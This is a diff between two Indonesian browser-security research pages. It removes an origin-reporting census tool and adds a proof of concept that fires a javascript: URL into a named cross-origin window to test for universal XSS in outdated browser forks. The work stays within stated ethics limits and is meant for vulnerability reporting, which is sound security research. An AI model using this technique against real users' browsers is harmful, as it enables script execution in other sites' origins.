@@ -1,189 +1,24 @@
-<!-- KONSTRUKSI: satu dokumen ditanya "siapa kamu" lewat 15 jalur pelaporan identitas SEKALIGUS, diulang di ~12 konstruksi dokumen patologis yang lahir dari SATU berkas; produknya bukan screenshot melainkan matriks perselisihan antar-pelapor + UNSAFE-PAIR LIST (origin kanonik SAMA, string mentah BEDA) yang tidak boleh dibandingkan dengan === di kode produksi. -->
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>46 — Origin Census: matriks perselisihan antar-pelapor identitas</title>
-<style>
- body{font:15px/1.55 system-ui,sans-serif;margin:0;padding:1rem;color:#111;background:#fff}
- .wrap{max-width:980px;margin:0 auto}
- h2{font-size:1.12rem;margin:.2rem 0 .8rem;line-height:1.35}
- .box{border:1px solid #ccc;border-left:5px solid #888;border-radius:8px;padding:.6rem .8rem;margin:.55rem 0}
- .box>b:first-child{display:block;font-size:.78rem;letter-spacing:.09em;color:#666;margin-bottom:.25rem}
- .tanya{border-left-color:#606;background:#faf7ff}.pagar{border-left-color:#0a7}.celah{border-left-color:#d33}
- .uji{border-left-color:#36c}.oracle{border-left-color:#e90}.kontrol{border-left-color:#777}.hasil{border-left-color:#606}
- .safe{border-left-color:#0a7;background:#f4fbf7}
- code{background:#f1f1f1;padding:.05rem .3rem;border-radius:4px;font-size:.9em;word-break:break-all}
- pre{background:#f7f7f7;border-radius:6px;padding:.6rem;overflow:auto;font-size:.78rem;margin:.3rem 0 0;
-     white-space:pre;max-height:24rem;line-height:1.35}
- button{font:inherit;padding:.45rem .8rem;margin:.15rem .3rem .15rem 0;border:1px solid #999;border-radius:7px;background:#fafafa;cursor:pointer}
- .note{font-size:.85rem;color:#666}
- .jujur{border:1px dashed #b00;border-radius:8px;padding:.6rem .8rem;font-size:.88rem;margin-top:1rem}
- @media(prefers-color-scheme:dark){body{background:#161616;color:#eaeaea}.box{border-color:#3a3a3a}
-  .tanya{background:#1b1626}.safe{background:#12211a}code{background:#2a2a2a}pre{background:#202020}
-  button{background:#242424;color:#eee;border-color:#555}.note,.box b{color:#9a9a9a}}
-</style>
-</head>
-<body><div class="wrap">
-
-<h2>46 — ORIGIN CENSUS: kalau satu dokumen ditanya siapa dirinya lewat 15 jalur sekaligus, apakah ke-15 jawabannya identik sebagai STRING?</h2>
-
-<div class="box tanya"><b>PERTANYAAN YANG BELUM PERNAH DIAJUKAN</b>
-Semua PoC spoofing bertanya <i>“APA yang ditampilkan?”</i>. Tidak ada yang bertanya
-<b>“SIAPA SAJA yang melaporkan identitas dokumen ini, dan apakah mereka SEPAKAT — bukan setara sebagai origin,
-melainkan identik sebagai string?”</b>
-Objek studi di sini bukan satu permukaan, melainkan <b>populasi pelapor</b>; temuannya berbentuk
-<b>pasangan jalur</b>, sebuah objek yang tidak punya tempat sama sekali di sumbu “apa yang ditampilkan”.
-<p class="note" style="margin:.4rem 0 0">URL asli halaman ini: <code id="href">…</code></p>
-</div>
-
-<div class="box pagar"><b>PAGAR</b>
-Browser dianggap punya satu kebenaran per dokumen: <i>origin</i>. Kode nyata mengandalkan itu setiap hari —
-<code>event.origin === location.origin</code>, allowlist dari <code>document.referrer</code>, log yang memakai
-<code>document.URL</code>, telemetri yang memakai <code>Error().stack</code>. Semua praktik itu diam-diam
-mengasumsikan bahwa semua pelapor menuliskan kebenaran yang sama <b>dengan ejaan yang sama</b>.
-</div>
-
-<div class="box celah"><b>CELAH — sudah dinamai di muka, sebelum diukur</b>
-Serialisasi origin dilakukan oleh subsistem yang ditulis terpisah, dan sebagiannya kehilangan informasi.
-Kelas tabrakan yang kami namai lebih dulu: <b>kelas “null”</b> — sandbox opaque, <code>data:</code>, dan turunan
-opaque lain melaporkan string <b>identik</b> (<code>"null"</code>) padahal ketiganya adalah origin yang
-<b>berbeda satuan</b>. Setiap <code>event.origin === X</code> dan setiap allowlist berbasis referrer patah di
-titik yang sama. Korbannya bukan mata manusia (itu wilayah IDN/homograf) melainkan <b>perbandingan string oleh
-KODE</b>; bentuk host cuma salah satu generator perselisihan.
-</div>
-
-<div class="box uji"><b>UJI</b>
-Satu berkas membangkitkan ≈12 konstruksi dokumen tanpa berkas kedua — dokumen atas · <code>srcdoc</code> ·
-<code>about:blank</code>+<code>document.write</code> · <code>blob:</code> · <code>data:</code> ·
-sandbox opaque · kembar kontrol <code>allow-same-origin</code> · blob&gt;srcdoc · <code>&lt;base href&gt;</code>
-diubah · <code>javascript:</code> · Worker · popup (opsional) — lalu memanen 15 pelapor <b>in-page</b> dari
-tiap dokumen dan menyimpan <b>dua</b> nilai per sel: string mentah + tuple kanonik (scheme,host,port).
-<p>
- <button id="pop">Tambah baris: popup about:blank (butuh klik, auto-tutup 2 dtk)</button>
- <button id="re">Render ulang</button>
-</p>
-<p class="note">Baris <b>TOP pasca-bfcache</b> muncul sendiri kalau kamu menavigasi keluar lalu menekan Back.
-Dicoret dari lingkup berkas ini: scriptURL service worker, header lewat kolektor, fenced frame, prerender.</p>
-</div>
-
-<div class="box oracle"><b>ORACLE</b>
-Bacaan utama <b>bukan</b> “ada yang beda”, melainkan <b>UNSAFE-PAIR LIST</b>: pasangan pelapor (A,B) yang
-origin kanoniknya <b>SAMA</b> tapi string mentahnya <b>BEDA</b>, ber-angka <code>n_beda/n_total</code>.
-Tiap baris di daftar itu = satu perbandingan <code>===</code> yang tidak boleh ditulis di kode produksi.
-Angka kedua: <b>P</b> = pasangan yang kanoniknya beda tapi satu string adalah <b>awalan</b> string lain
-(⇒ lolos <code>startsWith</code>/<code>indexOf</code>). Angka ketiga: <b>K-null</b> = berapa konstruksi
-dokumen berbeda yang melaporkan <code>"null"</code> yang sama persis.
-</div>
-
-<div class="box kontrol"><b>KONTROL</b>
-Kembar <code>sandbox="allow-scripts allow-same-origin"</code> adalah lengan kontrol satu-variabel untuk sandbox
-opaque: dua dokumen dengan isi identik, beda satu token. Dokumen atas adalah baseline; kalau baris atas saja
-sudah tidak konsisten dengan dirinya sendiri, seluruh tabel tidak bisa ditafsirkan.
-</div>
-
-<div class="box hasil"><b>HASIL 1 — SENSUS MENTAH (salin apa adanya)</b><pre id="raw">…</pre></div>
-<div class="box hasil"><b>HASIL 2 — MATRIKS PERSELISIHAN 15×15 (jumlah dokumen: kanonik sama, string beda)</b><pre id="mat">…</pre></div>
-<div class="box hasil"><b>HASIL 3 — UNSAFE-PAIR LIST + ANGKA HEADLINE</b><pre id="unsafe">…</pre></div>
-<div class="box hasil"><b>HASIL 4 — SERIALIZER PARSER URL: bentuk host yang berbeda → origin yang sama</b><pre id="host">…</pre></div>
-
-<div class="box safe"><b>BATAS KEAMANAN BERKAS INI</b>
-Tanpa <code>&lt;form&gt;</code>, tanpa input kredensial, tanpa fetch/XHR/WebSocket/beacon ke kolektor mana pun,
-tanpa cookie orang lain, tanpa peniruan merek, tanpa obfuskasi. Semua dokumen anak lahir dari berkas ini dan
-hidup di dalam <code>iframe</code> 10×10 px. Popup hanya terbuka setelah kamu mengklik dan menutup dirinya
-sendiri dalam 2 detik. Sensus berhenti sendiri setelah 3 detik; tidak ada loop tak berbatas.
-</div>
-
-<div class="jujur"><b>JUJUR — nol perselisihan tetap hasil yang sah.</b>
-Kalau UNSAFE-PAIR LIST kosong dan matriksnya nol semua, halaman ini akan mengatakannya dengan huruf besar:
-itu berarti korpus di bawah adalah <b>korpus regresi konsensus</b> yang bisa dipakai vendor untuk mengunci
-perilaku hari ini. Yang dilaporkan ke VRP hanya baris yang punya <b>angka</b> — dan hanya kalau pasangan itu
-benar-benar dipakai kode nyata sebagai pemeriksa keamanan.
-</div>
-
+<!-- 58 - javascript: diarahkan ke jendela BERNAMA milik korban   [UXSS popup | U1=popup U2=skema + penargetan-nama | T3 | macOS: Dia/Arc/Safari/Chrome]
+     GERBANG YANG DISERANG : pemblokiran skema javascript: lintas-origin, tapi lewat jalur penargetan-NAMA (bukan penugasan location)
+     DI MANA PALING MUNGKIN TEMBUS : fork yang tertinggal patch (Dia/Arc/Brave/Vivaldi/Opera/Samsung),
+                 WebView & in-app browser, build lama, atau konteks ber-sandbox/ekstensi. Di Chrome/Safari
+                 terbaru yang sehat, jawaban BLOCKED adalah jawaban yang BENAR - catat versinya, jangan dipaksa.
+     MEKANISME : jendela korban dibuka dengan sebuah NAMA, lalu window.open("javascript:...", nama-itu) dipakai untuk menembak skrip ke jendela yang kini ber-origin korban. Keluarga parser skema, tapi lewat jalur penargetan-nama, bukan penugasan location.
+     PREDIKAT  : skrip berjalan DI DALAM origin korban (ia melaporkan location.origin-nya sendiri).
+     AMAN      : akses lintas-origin ditolak SecurityError; baris bukti berkata BLOCKED.
+     ANTI-FP   : vonis HANYA dari pembacaan isi korban (judul/origin yang dilaporkan sendiri).
+                 "berhasil menulis" ke dokumen kosong awal BUKAN bukti - itu memang dokumen kita.
+                 Kontrol batch = 64.html; kalau 64 ikut CROSSED, semua hasil batch ini batal.
+     ETIKA     : browser & mesin sendiri. Korban = example.com (IANA reserved). Nol form, nol kredensial,
+                 nol fetch/beacon, nol resource luar. Berhenti di predikat -> screenshot -> lapor VRP. -->
+<meta charset="utf-8"><title>58 javascript: diarahkan ke jendela BERNAMA milik korban</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var RN=['location.href','location.origin','document.URL','document.documentURI','document.baseURI','document.domain','document.referrer','window.name','ancestorOrigins','Error().stack','navTiming.name','self.origin','cookie-write','isSecureContext','MessageEvent.origin@top'];
-var ROWS=[],SEEN={},NA={'N/A(worker)':1,'TIDAK-DIDUKUNG':1};
-document.getElementById('href').textContent=location.href;
-function CENSUS(id){var g=function(f){try{var v=f();return v===undefined||v===null?'(null)':(v===''?'(kosong)':String(v))}catch(e){return 'THROW:'+e.name}};
- var st=function(){var m=/((?:[a-z][a-z0-9+.-]*:)\/\/[^\s)]+|about:[a-z]+|blob:[^\s)]+|data:[^\s)]{0,40})/.exec((new Error).stack||'');return m?m[1]:'(tanpa URL)'};
- var v=[g(function(){return location.href}),g(function(){return location.origin}),g(function(){return document.URL}),
-  g(function(){return document.documentURI}),g(function(){return document.baseURI}),g(function(){return document.domain}),
-  g(function(){return document.referrer}),g(function(){return window.name}),
-  g(function(){return location.ancestorOrigins?(location.ancestorOrigins.length?Array.prototype.join.call(location.ancestorOrigins,' , '):'(kosong)'):'TIDAK-DIDUKUNG'}),
-  g(st),g(function(){var e=performance.getEntriesByType('navigation')[0];return e?e.name:'(kosong)'}),
-  g(function(){return typeof self.origin==='string'?self.origin:'TIDAK-DIDUKUNG'}),
-  g(function(){document.cookie='c46=1';return document.cookie.indexOf('c46=')>=0?'TULIS-OK':'(kosong)'}),
-  g(function(){return typeof isSecureContext==='boolean'?String(isSecureContext):'TIDAK-DIDUKUNG'})];
- try{top.postMessage({t:'c46',id:id,v:v},'*')}catch(e){}}
-function WCENSUS(){var g=function(f){try{var v=f();return v===''?'(kosong)':String(v)}catch(e){return 'THROW:'+e.name}},N='N/A(worker)';
- postMessage({t:'c46w',v:[g(function(){return location.href}),g(function(){return self.origin}),N,N,N,N,N,g(function(){return self.name}),N,
-  g(function(){var m=/((?:[a-z][a-z0-9+.-]*:)\/\/[^\s)]+|blob:[^\s)]+)/.exec((new Error).stack||'');return m?m[1]:'(tanpa URL)'}),N,
-  g(function(){return typeof self.origin==='string'?self.origin:'TIDAK-DIDUKUNG'}),N,g(function(){return String(isSecureContext)})]});}
-window.PROBE=function(id){return '<body><script>('+CENSUS.toString()+')('+JSON.stringify(id)+')<\/script>'};
-function esc(s){return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;')}
-function frame(sandbox,go){var f=document.createElement('iframe');f.style.cssText='position:absolute;left:-9999px;width:10px;height:10px;border:0';
- if(sandbox!==null)f.setAttribute('sandbox',sandbox);document.body.appendChild(f);try{go(f)}catch(e){}}
-function build(){
- frame(null,function(f){f.srcdoc=PROBE('02 srcdoc')});
- frame(null,function(f){f.src='about:blank';f.onload=function(){if(f.w)return;f.w=1;try{var d=f.contentDocument;d.open();d.write(PROBE('03 about:blank + document.write'));d.close()}catch(e){}}});
- frame(null,function(f){f.src=URL.createObjectURL(new Blob([PROBE('04 blob:')],{type:'text/html'}))});
- frame(null,function(f){f.src='data:text/html;charset=utf-8,'+encodeURIComponent(PROBE('05 data:'))});
- frame('allow-scripts',function(f){f.srcdoc=PROBE('06 sandbox opaque (allow-scripts)')});
- frame('allow-scripts allow-same-origin',function(f){f.srcdoc=PROBE('07 sandbox + allow-same-origin [KONTROL]')});
- frame(null,function(f){f.src=URL.createObjectURL(new Blob(['<body><iframe srcdoc="'+esc(PROBE('08 blob > srcdoc (bersarang)'))+'"></iframe>'],{type:'text/html'}))});
- frame(null,function(f){f.srcdoc='<base href="https://example.org/dir/">'+PROBE('09 srcdoc + <base href> diubah')});
- frame(null,function(f){f.src='javascript:top.PROBE("10 javascript: URL")'});
- try{var w=new Worker(URL.createObjectURL(new Blob(['('+WCENSUS.toString()+')()'],{type:'text/javascript'})));
-  w.onmessage=function(e){take('11 Worker (blob)',e.data.v,'(kosong — pesan Worker)')}}catch(e){take('11 Worker (blob)',null,'THROW:'+e.name)}
- CENSUS('01 TOP (dokumen atas)');}
-function take(id,v,org){if(SEEN[id])return;SEEN[id]=1;if(!v){v=[];for(var i=0;i<14;i++)v[i]='TIDAK-DIDUKUNG'}v[14]=org;ROWS.push([id,v]);render()}
-window.addEventListener('message',function(e){var d=e.data;if(!d||d.t!=='c46')return;take(d.id,d.v,String(e.origin)||'(kosong)')});
-window.addEventListener('pageshow',function(e){if(e.persisted)CENSUS('12 TOP pasca-bfcache')});
-function canon(s){s=String(s);if(!s||s.charAt(0)==='('||s.indexOf('THROW:')===0||NA[s]||s==='TULIS-OK'||s==='true'||s==='false')return s;
- try{var u=new URL(s);return u.protocol+'//'+String(u.hostname).replace(/\.$/,'').toLowerCase()+(u.port?':'+u.port:'')}catch(e){return s}}
-function cmp(s){return !(s.charAt(0)==='('||s.indexOf('THROW:')===0||NA[s])}
-function cut(s,n){s=String(s);return s.length>n?s.slice(0,n-1)+'…':s}
-function pad(s,n){s=String(s);while(s.length<n)s+=' ';return s}
-function n2(i){return (i<9?'0':'')+(i+1)}
-function render(){var i,j,k,r,a,b,s='';
- ROWS.sort(function(x,y){return x[0]<y[0]?-1:1});
- for(i=0;i<ROWS.length;i++){r=ROWS[i];s+=r[0]+'\n';
-  for(j=0;j<15;j++)s+='      '+n2(j)+' '+pad(RN[j],23)+' | '+pad(cut(r[1][j],78),79)+' | K: '+cut(canon(r[1][j]),40)+'\n';}
- document.getElementById('raw').textContent=s+'\n('+ROWS.length+' konstruksi dokumen x 15 pelapor = '+(ROWS.length*15)+' sel)';
- var M=[],T=[],P=0,PX=[];for(i=0;i<15;i++){M[i]=[];T[i]=[];for(j=0;j<15;j++){M[i][j]=0;T[i][j]=0}}
- for(k=0;k<ROWS.length;k++)for(i=0;i<15;i++)for(j=i+1;j<15;j++){a=String(ROWS[k][1][i]);b=String(ROWS[k][1][j]);
-  if(!cmp(a)||!cmp(b))continue;T[i][j]++;T[j][i]++;
-  if(canon(a)===canon(b)){if(a!==b){M[i][j]++;M[j][i]++}}
-  else if(a.length>4&&b.length>4&&(a.indexOf(b)===0||b.indexOf(a)===0)){P++;if(PX.length<6)PX.push(ROWS[k][0]+' :: '+RN[i]+' ⊂ '+RN[j])}}
- s='       ';for(j=0;j<15;j++)s+=n2(j)+' ';s+='\n';
- for(i=0;i<15;i++){s+='   '+n2(i)+'  ';for(j=0;j<15;j++)s+=(i===j?' - ':pad(String(M[i][j]),3));s+='  '+RN[i]+'\n'}
- document.getElementById('mat').textContent=s;
- var L=[];for(i=0;i<15;i++)for(j=i+1;j<15;j++)if(M[i][j])L.push([M[i][j],T[i][j],i,j]);
- L.sort(function(x,y){return y[0]-x[0]});
- var nulls=[];for(k=0;k<ROWS.length;k++)if(String(ROWS[k][1][1])==='null'||String(ROWS[k][1][14])==='null')nulls.push(ROWS[k][0]);
- s='K-null = '+nulls.length+' konstruksi dokumen berbeda melaporkan string identik "null"\n';
- for(k=0;k<nulls.length;k++)s+='   • '+nulls[k]+'\n';
- s+='\nP = '+P+' pasangan "kanonik beda tapi satu string adalah AWALAN string lain" (lolos startsWith/indexOf)\n';
- for(k=0;k<PX.length;k++)s+='   • '+PX[k]+'\n';
- s+='\nUNSAFE-PAIR LIST ('+L.length+' pasangan) — kanonik SAMA, string mentah BEDA:\n';
- if(!L.length)s+='   NOL PERSELISIHAN. Semua pelapor sepakat sampai ke ejaannya di korpus ini.\n   => ini BASELINE KONSENSUS + korpus regresi, dan itu hasil yang sah untuk dilaporkan.\n';
- for(k=0;k<L.length;k++)s+='   '+pad(L[k][0]+'/'+L[k][1],7)+' R'+n2(L[k][2])+' '+pad(RN[L[k][2]],23)+' ~ R'+n2(L[k][3])+' '+RN[L[k][3]]+'\n';
- document.getElementById('unsafe').textContent=s;
- var base=/^https?:$/.test(location.protocol)?location.protocol+'//'+location.hostname:'https://example.org',
-  hp=base.split('//'),h=hp[1],dp=hp[0]==='https:'?':443':':80',
-  forms=[h,h+'.',h.toUpperCase(),h+dp,'пример.рф','xn--e1afmkfd.xn--p1ai','[::1]'],o={},t='';
- for(i=0;i<forms.length;i++){var raw=hp[0]+'//'+forms[i]+'/x',og;try{og=new URL(raw).origin}catch(e){og='THROW'}
-  t+=pad(cut(raw,44),46)+' -> origin: '+og+'\n';o[og]=(o[og]||0)+1}
- var coll=0;for(k in o)if(o[k]>1)coll+=o[k]-1;
- document.getElementById('host').textContent=t+'\nTabrakan bentuk-host: '+coll+' bentuk mentah berbeda yang meng-kanonik ke origin yang sama.\n(Serializer parser URL adalah salah satu pelapor juga — ini generator UNSAFE-PAIR yang tidak butuh DNS kedua.)';
-}
-document.getElementById('re').onclick=render;
-document.getElementById('pop').onclick=function(){try{var w=window.open('','_blank','width=320,height=200');
- if(!w){alert('Popup diblokir browser — baris ini dilewati (bukan kegagalan berkas).');return}
- w.document.write(PROBE('13 popup about:blank'));w.document.close();setTimeout(function(){try{w.close()}catch(e){}},2000)}
- catch(e){take('13 popup about:blank',null,'THROW:'+e.name)}};
-build();setTimeout(render,1200);setTimeout(render,3000);
+var V='https://example.com/';var o;function say(s){o=o||document.getElementById('o');o.textContent=s;}
+function rd(w){try{var t=w.document.title;return 'CROSSED -> baca judul lintas-origin: "'+t+'"';}catch(e){return 'BLOCKED (aman): '+e.name;}}
+addEventListener('load',function(){say('REAL: '+location.origin+' | siap');});
+function go(){window.open(V,'vic','width=520,height=620');
+setTimeout(function(){try{window.open("javascript:try{opener.document.getElementById('o').textContent='CROSSED -> jalan di '+location.origin;}catch(e){}",'vic');}catch(e){say('ditolak saat open(): '+e.name);}
+setTimeout(function(){if(!/CROSSED/.test(document.getElementById('o').textContent))say('BLOCKED (aman): javascript: tidak dieksekusi di jendela korban');},1500);},3000);}
 </script>
-</div></body></html>
